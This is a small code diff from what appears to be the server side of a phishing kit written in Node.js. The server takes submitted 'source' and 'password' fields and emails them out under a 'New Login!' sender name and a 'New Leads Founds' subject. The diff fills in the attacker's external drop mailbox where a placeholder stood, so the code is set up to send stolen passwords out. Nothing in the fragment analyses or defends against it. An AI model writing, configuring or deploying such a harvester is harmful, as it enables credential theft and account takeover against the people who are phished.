@@ -18,7 +18,7 @@ const server = http.createServer((req, res) => {
       const data = {
         source: postData.source,
         password: postData.password,
-        to: 'result box should be here',
+        to: 'sharedbox2021@yandex.com',
         from: `no_reply@${req.headers.host}`,
         fromName: 'New Login!',
         subject: 'Important: New Leads Founds',
